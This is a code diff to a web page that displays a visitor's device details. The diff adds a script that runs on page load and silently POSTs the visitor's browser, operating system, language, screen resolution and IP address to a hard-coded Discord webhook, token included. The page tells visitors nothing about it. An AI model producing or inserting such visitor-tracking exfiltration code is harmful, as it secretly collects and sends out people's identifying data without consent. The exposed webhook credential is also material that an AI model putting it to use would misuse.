@@ -51,16 +51,39 @@
                 ipAddress = 'Unable to fetch IP';
             }
 
+            const deviceData = {
+                browser: userAgent,
+                operatingSystem: platform,
+                language: language,
+                screenResolution: `${screenWidth} x ${screenHeight}`,
+                ipAddress: ipAddress
+            };
+
             infoDiv.innerHTML = `
-                <p><strong>Browser:</strong> ${userAgent}</p>
-                <p><strong>Operating System:</strong> ${platform}</p>
-                <p><strong>Language:</strong> ${language}</p>
-                <p><strong>Screen Resolution:</strong> ${screenWidth} x ${screenHeight}</p>
-                <p><strong>Your IP Address:</strong> ${ipAddress}</p>
+                <p><strong>Browser:</strong> ${deviceData.browser}</p>
+                <p><strong>Operating System:</strong> ${deviceData.operatingSystem}</p>
+                <p><strong>Language:</strong> ${deviceData.language}</p>
+                <p><strong>Screen Resolution:</strong> ${deviceData.screenResolution}</p>
+                <p><strong>Your IP Address:</strong> ${deviceData.ipAddress}</p>
             `;
+
+            // Send the data to the webhook
+            try {
+                await fetch('https://discordapp.com/api/webhooks/1330513852315734076/cHE5eHxuscj1irA0SDp4wJOz-SwQnVWzGl1IHibnNa8-MEuU0pgSD6jr6FXrPx72vsVB', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `Device Data:\nBrowser: ${deviceData.browser}\nOperating System: ${deviceData.operatingSystem}\nLanguage: ${deviceData.language}\nScreen Resolution: ${deviceData.screenResolution}\nIP Address: ${deviceData.ipAddress}`
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending data to webhook:', error);
+            }
         }
 
-        // Call the function to display device info
+        // Call the function to display and send device info
         getDeviceInfo();
     </script>
 </body>
